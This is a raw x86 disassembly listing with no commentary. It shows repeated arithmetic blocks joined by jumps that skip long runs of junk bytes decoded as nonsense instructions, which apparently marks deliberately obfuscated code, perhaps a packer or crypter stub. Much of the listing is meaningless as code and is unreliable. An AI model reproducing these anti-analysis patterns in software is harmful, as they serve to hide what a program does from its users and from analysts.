  4021fa:	mov    edx,DWORD PTR [ebp-0x4]
  4021fd:	xor    edx,eax
  4021ff:	xor    DWORD PTR ds:0x427cff,0x42c896
  402209:	add    edx,ecx
  40220b:	cmp    edi,edx
  40220d:	mov    DWORD PTR ds:0x42c892,0x3c1d
  402217:	jb     0x402c81
  40221d:	mov    edx,DWORD PTR [ebp-0x28]
  402220:	jmp    0x402340
  402225:	fstp   DWORD PTR [edi-0x39]
  402228:	xlat   BYTE PTR ds:[ebx]
  402229:	jns    0x402292
  40222b:	stc    
  40222c:	popa   
  40222d:	mov    ebx,0xae3fc869
  402232:	int3   
  402233:	mov    ds:0x7c77882f,al
  402238:	jl     0x4022ab
  40223a:	jg     0x4022b8
  40223c:	jl     0x4021d2
  40223e:	lods   al,BYTE PTR ds:[esi]
  40223f:	push   ebx
  402240:	and    BYTE PTR [ebx-0x215a4474],0xbe
  402247:	xor    ch,ah
  402249:	sub    esi,DWORD PTR [eax]
  40224b:	push   ecx
  40224c:	arpl   WORD PTR [edx+edx*8-0x13],ax
  402250:	cmp    eax,0x823601a5
  402255:	(bad)  
  402256:	fadd   DWORD PTR [edx]
  402258:	push   eax
  402259:	jmp    0x382c0ab6
  40225e:	mov    ?,WORD PTR [eax+ebx*4-0x52734838]
  402265:	jmp    0xb9b6:0xbaf387f
  40226c:	jno    0x402207
  40226e:	in     al,0x3c
  402270:	hlt    
  402271:	cmp    bh,dl
  402273:	call   0xb9d3:0xc0ef3160
  40227a:	sub    BYTE PTR [edi+0x7185c381],cl
  402280:	xor    ecx,DWORD PTR [eax+0x661c465c]
  402286:	test   eax,0x9f32f9f7
  40228b:	pop    ebx
  40228c:	jo     0x402289
  40228e:	or     BYTE PTR [esi+0xa],ah
  402291:	stos   DWORD PTR es:[edi],eax
  402292:	adc    DWORD PTR [esp+ebp*8-0x64],esp
  402296:	ret    0xd881
  402299:	sub    DWORD PTR [ebx-0x7f6e5665],eax
  40229f:	xor    eax,0x2e2c6e38
  4022a4:	push   edx
  4022a5:	lock repz pop edi
  4022a8:	(bad)  
  4022a9:	outs   dx,DWORD PTR ds:[esi]
  4022aa:	ss mov edx,0x222be9a
  4022b0:	jecxz  0x4022e3
  4022b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022b3:	ja     0x4022f8
  4022b5:	mov    edx,0xd6bf6ccf
  4022ba:	dec    edi
  4022bb:	in     eax,dx
  4022bc:	adc    al,0xd1
  4022be:	inc    ecx
  4022bf:	push   ds
  4022c0:	std    
  4022c1:	mov    ds:0x602c38f8,al
  4022c6:	jns    0x402303
  4022c8:	cwde   
  4022c9:	lods   eax,DWORD PTR ds:[esi]
  4022ca:	and    ch,bl
  4022cc:	lock adc ecx,eax
  4022cf:	cs and eax,ebp
  4022d2:	and    BYTE PTR [esi+0x9fa6b65],cl
  4022d8:	sbb    ah,ch
  4022da:	pop    eax
  4022db:	xchg   edi,eax
  4022dc:	pushf  
  4022dd:	mov    esi,0x7cab5002
  4022e2:	pusha  
  4022e3:	dec    esi
  4022e4:	call   0xef85:0xe1e59f7a
  4022eb:	cmp    ecx,DWORD PTR [ecx-0x17]
  4022ee:	xchg   ebp,eax
  4022ef:	jl     0x4022aa
  4022f1:	mov    edx,0x988e19df
  4022f6:	fst    QWORD PTR [esi]
  4022f8:	in     al,0xf1
  4022fa:	arpl   bx,sp
  4022fc:	leave  
  4022fd:	scas   eax,DWORD PTR es:[edi]
  4022fe:	jb     0x40230f
  402300:	sub    ch,BYTE PTR [edx-0x3d197832]
  402306:	mov    eax,0x71e1c7e5
  40230b:	(bad)  
  40230c:	and    cl,BYTE PTR [eax]
  40230e:	mov    ch,0x2a
  402310:	icebp  
  402311:	loope  0x402315
  402313:	and    al,0xa5
  402315:	inc    ebx
  402316:	das    
  402317:	adc    cl,bl
  402319:	sub    al,0xc8
  40231b:	mov    edx,0xf95b1926
  402320:	dec    esp
  402321:	cld    
  402322:	in     eax,dx
  402323:	ret    0x9be7
  402326:	xor    eax,0xd75754f5
  40232b:	(bad)  
  40232c:	mov    ecx,0x94ac0004
  402331:	jae    0x402388
  402333:	dec    esi
  402334:	add    bh,ch
  402336:	int3   
  402337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402338:	sbb    edx,DWORD PTR [eax]
  40233a:	fnstenv [ecx-0x4b]
  40233d:	push   cs
  40233e:	das    
  40233f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402340:	mov    edi,DWORD PTR [ebp-0x4]
  402343:	xor    edx,eax
  402345:	not    ebx
  402347:	xor    edi,eax
  402349:	mov    ebx,DWORD PTR ds:0x4292bd
  40234f:	add    ebx,DWORD PTR ds:0x427cf7
  402355:	mov    DWORD PTR ds:0x4292bd,ebx
  40235b:	add    edi,ecx
  40235d:	movzx  ebx,WORD PTR ds:0x427598
  402364:	or     ebx,DWORD PTR ds:0x42c892
  40236a:	mov    DWORD PTR ds:0x427598,ebx
  402370:	add    edx,ecx
  402372:	imul   edx,edi
  402375:	mov    ebx,DWORD PTR ds:0x4292d5
  40237b:	sbb    DWORD PTR ds:0x427d0f,ebx
  402381:	mov    edi,DWORD PTR [ebp-0x8]
  402384:	mov    ebx,DWORD PTR [ebp-0x10]
  402387:	sbb    DWORD PTR ds:0x4292a1,0x3598
  402391:	sub    ebx,edi
  402393:	mov    DWORD PTR ds:0x427d13,0x71c6
  40239d:	cmp    ebx,edx
  40239f:	mov    DWORD PTR ds:0x42759c,0x6366
  4023a9:	ja     0x4023ce
  4023af:	movzx  edx,WORD PTR ds:0x4292d9
  4023b6:	xor    edx,DWORD PTR ds:0x4292a9
  4023bc:	mov    DWORD PTR ds:0x4292d9,edx
  4023c2:	mov    edx,DWORD PTR [ebp-0x4]
  4023c5:	xor    edx,eax
  4023c7:	add    edx,ecx
  4023c9:	jmp    0x402807
  4023ce:	mov    edx,DWORD PTR [ebp-0x2c]
  4023d1:	mov    edi,DWORD PTR [ebp-0x4]
  4023d4:	xor    edx,eax
  4023d6:	xor    edi,eax
  4023d8:	add    edi,ecx
  4023da:	add    edx,ecx
  4023dc:	imul   edx,edi
  4023df:	mov    edi,DWORD PTR [ebp-0x8]
  4023e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4023e5:	sub    ebx,edi
  4023e7:	cmp    ebx,edx
  4023e9:	ja     0x4023f7
  4023ef:	mov    edx,DWORD PTR [ebp-0x28]
  4023f2:	jmp    0x4027f9
  4023f7:	mov    edx,DWORD PTR [ebp-0x30]
  4023fa:	mov    edi,DWORD PTR [ebp-0x4]
  4023fd:	xor    edx,eax
  4023ff:	xor    edi,eax
  402401:	add    edi,ecx
  402403:	add    edx,ecx
  402405:	imul   edx,edi
  402408:	mov    edi,DWORD PTR [ebp-0x8]
  40240b:	mov    ebx,DWORD PTR [ebp-0x10]
  40240e:	sub    ebx,edi
  402410:	cmp    ebx,edx
  402412:	ja     0x402420
  402418:	mov    edx,DWORD PTR [ebp-0x2c]
  40241b:	jmp    0x4027f9
  402420:	mov    edx,DWORD PTR [ebp-0x34]
  402423:	mov    edi,DWORD PTR [ebp-0x4]
  402426:	xor    edx,eax
  402428:	xor    edi,eax
  40242a:	add    edi,ecx
  40242c:	add    edx,ecx
  40242e:	imul   edx,edi
  402431:	mov    edi,DWORD PTR [ebp-0x8]
  402434:	jmp    0x402554
  402439:	ret    
  40243a:	fwait
  40243b:	dec    ebp
  40243c:	int    0x4d
  40243e:	fld    QWORD PTR [ebx-0x63]
  402441:	out    0xff,al
  402443:	loop   0x4024a4
  402445:	push   0x8d3d1c90
  40244a:	jbe    0x4024c8
  40244c:	jl     0x4024bf
  40244e:	jg     0x4024cc
  402450:	jl     0x40243a
  402452:	xchg   edi,eax
  402453:	push   es
  402454:	sbb    bl,0xe0
  402457:	mov    ebx,0x40fc08d4
  40245c:	xor    eax,0x5cd2f8ac
  402461:	(bad)  
  402462:	fwait
  402463:	push   ds
  402464:	rcr    BYTE PTR [esi+0x2e],cl
  402467:	dec    edx
  402468:	adc    bl,BYTE PTR [esp+edi*1-0x73]
  40246c:	push   esp
  40246d:	in     eax,0xc2
  40246f:	lock add ebx,DWORD PTR [ebx-0x5517994e]
  402476:	inc    ecx
  402477:	ret    
  402478:	mov    ebp,0x735f7a31
  40247d:	cs aaa 
  40247f:	into   
  402480:	scas   eax,DWORD PTR es:[edi]
  402481:	retf   
  402482:	push   ebp
  402483:	pop    es
  402484:	addr16 jo 0x4024d8
  402487:	int3   
  402488:	(bad)  
  402489:	and    BYTE PTR [ebp+0x23],ch
  40248c:	cwde   
  40248d:	jg     0x402495
  40248f:	(bad)  
  402490:	fcom   DWORD PTR [edi+0x7d]
  402493:	ins    BYTE PTR es:[edi],dx
  402494:	mov    edx,0xe2a0d338
  402499:	sbb    ch,0xc6
  40249c:	mov    DWORD PTR [ecx+ecx*1],ebx
  40249f:	adc    eax,0xe9c148d3
  4024a4:	dec    edx
  4024a5:	adc    edi,DWORD PTR [eax+0x2c]
  4024a8:	(bad)  
  4024a9:	cwde   
  4024aa:	mov    ebx,0x911bcb19
  4024af:	hlt    
  4024b0:	dec    ebx
  4024b1:	adc    BYTE PTR [ecx-0x37c3e328],0xa9
  4024b8:	dec    esi
  4024b9:	mov    esp,0x883f3e21
  4024be:	jecxz  0x402448
  4024c0:	cmp    ebp,ebx
  4024c2:	cmp    al,0x6d
  4024c4:	sar    DWORD PTR [edx],cl
  4024c6:	inc    edx
  4024c7:	sbb    dh,bl
  4024c9:	jns    0x4024b8
  4024cb:	test   BYTE PTR [edi],al
  4024cd:	mov    ch,0x41
  4024cf:	add    ebx,DWORD PTR [esp+edi*4+0x39d57a4f]
  4024d6:	push   edi
  4024d7:	sub    DWORD PTR [ebp+edi*1-0x6a5a5bd1],eax
  4024de:	pop    eax
  4024df:	sbb    al,0x9c
  4024e1:	adc    dl,BYTE PTR [ebx-0x79]
  4024e4:	pop    ebp
  4024e5:	aaa    
  4024e6:	mov    ebx,0xf1a58614
  4024eb:	lods   eax,DWORD PTR ds:[esi]
  4024ec:	pop    edi
  4024ed:	hlt    
  4024ee:	repnz cli 
  4024f0:	add    BYTE PTR [edx-0x48441218],cl
  4024f6:	mov    eax,0x1cefb9f2
  4024fb:	adc    edx,DWORD PTR [ebp-0x11]
  4024fe:	jecxz  0x4024c3
  402500:	and    BYTE PTR [ecx],0x33
  402503:	add    BYTE PTR [edx+ecx*1],ah
  402506:	add    DWORD PTR [esi+0x29371055],edi
  40250c:	ja     0x4024ab
  40250e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40250f:	dec    ebp
  402510:	(bad)  
  402511:	jb     0x40257c
  402513:	adc    ecx,DWORD PTR [edi-0x5]
  402516:	xchg   ebp,eax
  402517:	sub    ebx,DWORD PTR [edi+0x11c31ff8]
  40251d:	test   eax,0xe6575d67
  402522:	fsubr  QWORD PTR [ebp-0x698a56d7]
  402528:	jle    0x402520
  40252a:	pop    ebp
  40252b:	jo     0x402590
  40252d:	mov    cl,0x25
  40252f:	xlat   BYTE PTR ds:[ebx]
  402530:	xor    al,0xba
  402532:	pop    edi
  402533:	jne    0x4024d9
  402535:	bsr    esp,DWORD PTR [ebx-0x348b7aa3]
  40253c:	in     eax,dx
  40253d:	loop   0x4024df
  40253f:	sbb    DWORD PTR [eax+ecx*4+0x7f],edx
  402543:	retf   0x7fa7
  402546:	mov    bh,0xbf
  402548:	jecxz  0x402557
  40254a:	cmp    edi,DWORD PTR [ebp+0x1fbf78fd]
  402550:	mov    bl,0x51
  402552:	adc    al,0xbb
  402554:	mov    ebx,DWORD PTR [ebp-0x10]
  402557:	sub    ebx,edi
  402559:	cmp    ebx,edx
  40255b:	ja     0x402569
  402561:	mov    edx,DWORD PTR [ebp-0x30]
  402564:	jmp    0x4027f9
  402569:	mov    edx,DWORD PTR [ebp-0x38]
  40256c:	mov    edi,DWORD PTR [ebp-0x4]
  40256f:	xor    edx,eax
  402571:	xor    edi,eax
  402573:	add    edi,ecx
  402575:	add    edx,ecx
  402577:	imul   edx,edi
  40257a:	mov    edi,DWORD PTR [ebp-0x8]
  40257d:	mov    ebx,DWORD PTR [ebp-0x10]
  402580:	sub    ebx,edi
  402582:	cmp    ebx,edx
  402584:	ja     0x402592
  40258a:	mov    edx,DWORD PTR [ebp-0x34]
  40258d:	jmp    0x4027f9
  402592:	mov    edx,DWORD PTR [ebp-0x3c]
  402595:	mov    edi,DWORD PTR [ebp-0x4]
  402598:	xor    edx,eax
  40259a:	xor    edi,eax
  40259c:	add    edx,ecx
  40259e:	add    edi,ecx
  4025a0:	jmp    0x4026c0
  4025a5:	push   ds
  4025a6:	in     al,0x25
  4025a8:	pop    es
  4025a9:	std    
  4025aa:	(bad)  [edx]
  4025ac:	stc    
  4025ad:	dec    edx
  4025ae:	mov    WORD PTR [ebp-0x45],?
  4025b1:	pushf  
  4025b2:	push   edi
  4025b3:	mov    esp,0x7c098e37
  4025b8:	jl     0x40262b
  4025ba:	jg     0x402638
  4025bc:	jl     0x40254d
  4025be:	sub    eax,0xcb6d470e
  4025c3:	pop    ebp
  4025c4:	push   ss
  4025c5:	scas   al,BYTE PTR es:[edi]
  4025c6:	stc    
  4025c7:	sbb    eax,0x17e1fcbe
  4025cc:	add    eax,edi
  4025ce:	out    dx,al
  4025cf:	sbb    al,0xce
  4025d1:	retf   0xd9de
  4025d4:	inc    edi
  4025d5:	dec    ebp
  4025d6:	stos   BYTE PTR es:[edi],al
  4025d7:	push   ebp
  4025d8:	and    al,0x7f
  4025da:	shr    DWORD PTR [edi],cl
  4025dc:	xchg   DWORD PTR [ebp+0x6b],esi
  4025df:	mov    edx,0x2df4c359
  4025e4:	xor    eax,0xe56f19b1
  4025e9:	dec    esi
  4025ea:	push   cs
  4025eb:	dec    esi
  4025ec:	popf   
  4025ed:	jb     0x40260d
  4025ef:	(bad)  
  4025f0:	push   esp
  4025f1:	mov    eax,0x1298e201
  4025f6:	jb     0x402594
  4025f8:	jnp    0x4025a4
  4025fa:	bound  esi,QWORD PTR [edi-0x2a]
  4025fd:	arpl   di,di
  4025ff:	fld    QWORD PTR [edi-0x575df37b]
  402605:	repz or BYTE PTR [eax],0x36
  402609:	mov    ds:0x68cb6724,eax
  40260e:	lds    edx,FWORD PTR [eax]
  402610:	add    ebx,0x6c
  402613:	cmp    al,0x9b
  402615:	das    
  402616:	fnsave [edx+0x118e031b]
  40261c:	cli    
  40261d:	je     0x402611
  40261f:	aas    
  402620:	pushf  
  402621:	pop    eax
  402622:	ja     0x4025d8
  402624:	mov    ds:0xb126c971,al
  402629:	cdq    
  40262a:	lods   eax,DWORD PTR ds:[esi]
  40262b:	cmp    dh,BYTE PTR [edx-0x472ff7ae]
  402631:	stos   BYTE PTR es:[edi],al
  402632:	xor    BYTE PTR [ebx-0x7d],ch
  402635:	xchg   esi,eax
  402636:	shl    edx,0xe
  402639:	stos   DWORD PTR es:[edi],eax
  40263a:	add    al,0xbe
  40263c:	test   BYTE PTR [edx],ch
  40263e:	adc    ax,0x1723
  402642:	call   0xf4a7d42a
  402647:	and    al,0xa1
  402649:	shl    ebx,0x11
  40264c:	and    ecx,ebp
  40264e:	pop    es
  40264f:	shr    DWORD PTR [eax-0x56],0xf7
  402653:	(bad)  
  402654:	or     al,0xb3
  402656:	fsqrt  
  402658:	dec    edi
  402659:	ins    DWORD PTR es:[edi],dx
  40265a:	jb     0x40265e
  40265c:	jbe    0x40265e
  40265e:	lea    ecx,ds:0xffd80e23
  402664:	(bad)  
  402665:	mov    al,ds:0x2006386c
  40266b:	in     al,0x5b
  40266d:	aam    0x9e
  40266f:	in     eax,dx
  402670:	inc    ecx
  402672:	pop    esi
  402673:	in     eax,0x52
  402675:	pop    ecx
  402676:	add    al,0xfd
  402678:	jge    0x40262e
  40267a:	sub    eax,0x2cf516b9
  40267f:	push   edx
  402680:	sar    bl,cl
  402682:	and    DWORD PTR [eax+0x2a],esi
  402685:	loopne 0x402670
  402687:	cmp    dh,bh
  402689:	retf   0x39d0
  40268c:	stos   DWORD PTR es:[edi],eax
  40268d:	sbb    al,BYTE PTR [edi-0x1b7a24fa]
  402693:	aam    0xcd
  402695:	sub    eax,0x74f9d880
  40269a:	es add al,0x9b
  40269d:	aad    0xb8
  40269f:	(bad)  
  4026a0:	aad    0x92
  4026a2:	stc    
  4026a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026a4:	cmp    al,0x8f
  4026a6:	mov    eax,ds:0x1eae87bf
  4026ab:	or     eax,DWORD PTR [edi]
  4026ad:	fisttp DWORD PTR [edi]
  4026af:	and    dh,al
  4026b1:	pop    ebp
  4026b2:	daa    
  4026b3:	aad    0x5d
  4026b5:	rcl    eax,cl
  4026b7:	jp     0x4026aa
  4026b9:	mov    esp,0xb9f00c9c
  4026be:	mov    eax,ds:0xd7af0f73
  4026c3:	mov    edi,DWORD PTR [ebp-0x8]
  4026c6:	jmp    0x4027e6
  4026cb:	test   eax,0x4dcf8b5f
  4026d0:	sti    
  4026d1:	jge    0x40274c
  4026d3:	test   BYTE PTR [ebx],0x46
  4026d6:	adc    eax,0xcde3d5fb
  4026db:	or     DWORD PTR [eax],0x7c
  4026de:	jl     0x402751
  4026e0:	jg     0x40275e
  4026e2:	jl     0x40271c
  4026e4:	sub    DWORD PTR [esi],0xffffffb9
  4026e7:	ja     0x4026d6
  4026e9:	mov    esi,0xf0c3fbab
  4026ee:	adc    DWORD PTR [ebx-0x45],ebx
  4026f1:	test   eax,0xa705cfbe
  4026f6:	cld    
  4026f7:	outs   dx,DWORD PTR ds:[esi]
  4026f8:	shr    DWORD PTR [eax-0x7cef5069],1
  4026fe:	mov    ds:0x4a7a02d4,eax
  402703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402704:	cmp    bh,BYTE PTR [ecx+0x679e1280]
  40270a:	sahf   
  40270b:	ret    
  40270c:	int    0xa
  40270e:	out    0x37,al
  402710:	bswap  edi
  402712:	call   0x293e:0x6eeebcf
  402719:	dec    ecx
  40271a:	jge    0x40278d
  40271c:	out    0xf9,eax
  40271e:	push   es
  40271f:	int3   
  402720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402721:	xor    eax,0x7afd69e9
  402726:	cmp    BYTE PTR [esi*1-0x58fad719],cl
  40272d:	clc    
  40272e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40272f:	clc    
  402730:	mov    eax,ds:0x5185aa4c
  402735:	mov    ebp,0xb3bd008e
  40273a:	rcl    BYTE PTR [edi],cl
  40273c:	jmp    0x4a2b:0x1e19f9c3
  402743:	(bad)  
  402744:	pushf  
  402745:	jle    0x402776
  402747:	xor    al,0xec
  402749:	imul   ecx,DWORD PTR [eax-0x6665f9df],0x12b47c0f
  402753:	inc    esi
  402754:	fcmovnbe st,st(1)
  402756:	mov    BYTE PTR [ebx-0xf],0xdd
  40275a:	add    eax,0x978f12df
  40275f:	daa    
  402760:	mov    ss,WORD PTR [edx-0x3e]
  402763:	mov    eax,ds:0xf0f30145
  402768:	xor    BYTE PTR [eax],al
  40276a:	inc    esp
  40276b:	jns    0x40270d
  40276d:	jbe    0x402759
  40276f:	sub    BYTE PTR [ecx-0x54],bh
  402772:	retf   
  402773:	mov    bh,0x49
  402775:	dec    ebx
  402776:	sar    DWORD PTR [esi-0x55],cl
  402779:	dec    ebx
  40277a:	adc    bh,BYTE PTR [edi]
  40277c:	jns    0x402795
  40277e:	fidivr DWORD PTR [ecx+0x5d3be17b]
  402784:	mov    ecx,0xe82c0e79
  402789:	in     al,dx
  40278a:	fild   QWORD PTR [ebx-0x109438ac]
  402790:	rcl    BYTE PTR [edx+0x3d0bf8ca],0x9b
  402797:	ja     0x402802
  402799:	retf   0xcf65
  40279c:	cs in  al,0x16
  40279f:	dec    eax
  4027a0:	add    ch,BYTE PTR [ebx+0x3b948ea8]
  4027a6:	mov    esp,0xd1cc6de3
  4027ab:	xchg   edx,eax
  4027ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027ad:	mov    eax,ds:0xcf967163
  4027b2:	cwde   
  4027b3:	adc    DWORD PTR [esi-0x1b],edi
  4027b6:	and    eax,0x58e8690b
  4027bb:	test   eax,0x80df9a30
  4027c0:	mov    dl,cl
  4027c2:	clc    
  4027c3:	lock xor ecx,ebp
  4027c6:	push   0xe52169b7
  4027cb:	not    edi
  4027cd:	in     eax,dx
  4027ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027cf:	dec    edx
  4027d0:	gs xchg esi,eax
  4027d2:	add    eax,0x3e483a1f
  4027d7:	out    0xf2,eax
  4027d9:	test   DWORD PTR [edx-0x1672226d],edx
  4027df:	scas   al,BYTE PTR es:[edi]
  4027e0:	test   eax,0xc79881db
  4027e5:	ror    DWORD PTR [ebx-0x20d40fa3],1
  4027eb:	cmp    ebx,edx
  4027ed:	mov    edx,DWORD PTR [ebp-0x38]
  4027f0:	jbe    0x4027f9
  4027f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4027f9:	mov    edi,DWORD PTR [ebp-0x4]
  4027fc:	xor    edi,eax
  4027fe:	xor    edx,eax
  402800:	add    edi,ecx
  402802:	add    edx,ecx
  402804:	imul   edx,edi
  402807:	mov    DWORD PTR [ebp+0xc],edx
  40280a:	mov    edx,DWORD PTR [ebp+0xc]
  40280d:	mov    DWORD PTR [ebp-0x24],edx
  402810:	mov    edx,DWORD PTR [ebp-0x8]
  402813:	add    edx,DWORD PTR [ebp-0x40]
  402816:	jmp    0x402936
  40281b:	push   esp
  40281c:	in     al,dx
  40281d:	dec    ebx
  40281e:	dec    ebp
  40281f:	pop    ebx
  402820:	jge    0x402878
  402822:	in     eax,0xc9
  402824:	std    
  402825:	ja     0x402846
  402827:	mov    esi,ebp
  402829:	fist   WORD PTR [ebx]
  40282b:	test   BYTE PTR [ebx],cl
  40282d:	jl     0x4028ab
  40282f:	jno    0x4028b0
  402831:	jl     0x4028af
  402833:	clc    
  402834:	cwde   
  402835:	jae    0x402865
  402837:	pop    eax
  402838:	rol    BYTE PTR [eax-0x592b116b],1
  40283e:	push   esi
  40283f:	mov    bh,0x5
  402841:	into   
  402842:	sub    eax,0x5f8ace8b
  402847:	xchg   ebx,eax
  402848:	mov    ch,0x13
  40284a:	cld    
  40284b:	leave  
  40284c:	mov    eax,ds:0x9b62b8fb
  402851:	imul   edi,DWORD PTR [esi+0x48],0xcf9e43d4
  402858:	ja     0x402830
  40285a:	push   esp
  40285b:	add    ebp,0xbbc66b1a
  402861:	cmp    eax,0xfcd94f71
  402866:	in     al,0x61
  402868:	sbb    cl,cl
  40286a:	stc    
  40286b:	jne    0x402834
  40286d:	cmp    eax,0x9deda015
  402872:	lock and DWORD PTR [eax+0x2e],0xffffffa2
  402877:	pop    ecx
  402878:	xchg   edi,eax
  402879:	mov    eax,0xe45104ea
  40287e:	fbld   TBYTE PTR [edx+ebx*2-0x78d53f06]
  402885:	imul   edi,DWORD PTR [ebp-0x217bdfd2],0x7f
  40288c:	add    al,dl
  40288e:	in     eax,dx
  40288f:	in     al,0x3b
  402891:	(bad)  
  402892:	xor    ebp,edx
  402894:	mov    bh,0xb5
  402896:	jecxz  0x4028c4
  402898:	ds mov al,0x8b
  40289b:	add    eax,0x461f9ae2
  4028a0:	daa    
  4028a1:	fcom   st(1)
  4028a3:	loope  0x402842
  4028a5:	lahf   
  4028a6:	je     0x402842
  4028a8:	scas   al,BYTE PTR es:[edi]
  4028a9:	fwait
  4028aa:	lods   eax,DWORD PTR ds:[esi]
  4028ab:	lods   eax,DWORD PTR ds:[esi]
  4028ac:	jbe    0x402841
  4028ae:	mov    ecx,0x84627191
  4028b3:	xor    ch,al
  4028b5:	cdq    
  4028b6:	inc    esi
  4028b7:	iret   
  4028b8:	mov    ebp,es
  4028ba:	adc    al,0xc6
  4028bc:	out    dx,al
  4028bd:	xchg   ebx,eax
  4028be:	cmp    esp,DWORD PTR [ecx-0x67]
  4028c1:	leave  
  4028c2:	jecxz  0x4028e1
  4028c4:	out    dx,eax
  4028c5:	int    0x74
  4028c7:	inc    ebp
  4028c8:	ret    0xb875
  4028cb:	pop    esi
  4028cc:	jg     0x4028c8
  4028ce:	dec    ebx
  4028cf:	std    
  4028d0:	lds    ebx,FWORD PTR [edi]
  4028d2:	mov    bh,BYTE PTR [ecx+0x3a]
  4028d5:	pop    ss
  4028d6:	add    ecx,0x22fb8bd7
  4028dc:	push   ss
  4028dd:	and    al,0x76
  4028df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028e0:	push   ebx
  4028e1:	les    edx,FWORD PTR [eax-0x65]
  4028e4:	inc    edx
  4028e5:	and    al,0xcd
  4028e7:	int3   
  4028e8:	pop    ebx
  4028e9:	lock fwait
  4028eb:	mov    ebp,0x40f70151
  4028f0:	test   DWORD PTR [ebx-0x26],ebp
  4028f3:	jl     0x402972
  4028f5:	xchg   esi,eax
  4028f6:	or     BYTE PTR [ecx+0x56],0x9d
  4028fa:	imul   ecx,DWORD PTR [edx],0x1c3bcde8
  402900:	xor    BYTE PTR [ebp-0x74324fd],cl
  402906:	jo     0x40292a
  402908:	pop    ss
  402909:	sub    DWORD PTR [edx+eax*4-0x22],esp
  40290d:	pop    edi
  40290e:	js     0x402912
  402910:	(bad)  
  402911:	std    
  402912:	aam    0xa4
  402914:	or     ecx,DWORD PTR [eax]
  402916:	jmp    0x4028cf
  402918:	and    ah,dl
  40291a:	add    al,0xb7
  40291c:	(bad)  
  40291d:	push   ds
  40291e:	adc    esi,DWORD PTR [ecx]
  402920:	pop    edx
  402921:	sbb    eax,0x19388fe2
  402926:	cmp    eax,0xea402f4d
  40292b:	mov    gs,WORD PTR [ebx]
  40292d:	rol    DWORD PTR [ebp+edx*1+0x1444cb8c],cl
  402934:	sbb    bl,ah
  402936:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40293d:	mov    DWORD PTR [ebp-0x1c],edx
  402940:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  402947:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40294e:	mov    edx,DWORD PTR [ebp-0x18]
  402951:	xor    edx,eax
  402953:	add    edx,ecx
  402955:	jmp    0x402ae2
  40295a:	mov    edx,DWORD PTR [ebp-0x18]
  40295d:	xor    edx,eax
  40295f:	add    edx,DWORD PTR [ebp-0x14]
  402962:	mov    edi,DWORD PTR [ebp-0x1c]
  402965:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  40296c:	mov    BYTE PTR [ebp+0xf],dl
  40296f:	mov    edx,DWORD PTR [ebp-0xc]
  402972:	xor    edx,eax
  402974:	add    edx,DWORD PTR [ebp-0x14]
  402977:	mov    edi,DWORD PTR [ebp-0x1c]
  40297a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  402981:	mov    BYTE PTR [ebp+0xb],dl
  402984:	mov    dl,BYTE PTR [ebp+0xf]
  402987:	mov    edi,DWORD PTR [ebp-0xc]
  40298a:	jmp    0x402aaa
  40298f:	inc    eax
  402990:	(bad)
  402993:	imul   edi,DWORD PTR [edx+0x43],0x97beacfd
  40299a:	jno    0x4029cc
  40299c:	outs   dx,DWORD PTR ds:[esi]
  40299d:	sbb    eax,0x7c0a9975
  4029a2:	jl     0x402a15
  4029a4:	jg     0x402a22
  4029a6:	jl     0x4029f0
  4029a8:	xor    DWORD PTR [ebx],edx
  4029aa:	or     DWORD PTR [ecx+0x4a],esi
  4029ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029ae:	shl    DWORD PTR [eax+0x1c],0x81
  4029b2:	popf   
  4029b3:	mov    ecx,0x48a33da7
  4029b8:	stos   BYTE PTR es:[edi],al
  4029b9:	das    
  4029ba:	lea    ebp,[eax]
  4029bc:	or     BYTE PTR [edi+0x77],0x6a
  4029c0:	ds or  ebp,edx
  4029c3:	and    eax,0xb79efdeb
  4029c8:	mov    ebx,0x13521dd2
  4029cd:	clc    
  4029ce:	clc    
  4029cf:	int3   
  4029d0:	ror    DWORD PTR [eax],1
  4029d2:	jnp    0x40297e
  4029d4:	int    0x81
  4029d6:	loopne 0x402968
  4029d8:	ret    0x7e11
  4029db:	aam    0xd5
  4029dd:	sub    DWORD PTR [edx-0x772a4e46],esi
  4029e3:	add    eax,DWORD PTR [edi]
  4029e5:	jmp    0x8ab9:0x70fd89cd
  4029ec:	std    
  4029ed:	jbe    0x4029d5
  4029ef:	icebp  
  4029f0:	or     esi,esi
  4029f2:	adc    DWORD PTR ds:0x4f5abaad,eax
  4029f8:	mov    edi,0x5cb984ad
  4029fd:	jl     0x4029e3
  4029ff:	aaa    
  402a00:	fadd   DWORD PTR [edx]
  402a02:	nop
  402a03:	test   al,0x23
  402a05:	(bad)  
  402a06:	mov    bh,0xc0
  402a08:	psrlw  mm7,QWORD PTR [ebx-0xa1b7b3]
  402a0f:	sbb    al,0x15
  402a11:	add    al,0x4a
  402a13:	daa    
  402a14:	cmp    esp,0x9da5e5f1
  402a1a:	cld    
  402a1b:	sub    BYTE PTR [ebx],0x5a
  402a1e:	sbb    bh,bl
  402a20:	xor    dh,BYTE PTR [eax-0x26]
  402a23:	fldcw  WORD PTR [edx-0x4110e365]
  402a29:	iret   
  402a2a:	or     DWORD PTR [edx],ebp
  402a2c:	daa    
  402a2d:	popf   
  402a2e:	ins    BYTE PTR es:[edi],dx
  402a2f:	push   ebx
  402a30:	pop    es
  402a31:	inc    edi
  402a32:	pop    esi
  402a33:	mov    ds:0xf63be6e9,al
  402a38:	and    esp,edx
  402a3a:	xor    al,0x3
  402a3c:	(bad)  
  402a3e:	cdq    
  402a3f:	mov    ch,0xcd
  402a41:	and    al,0xbd
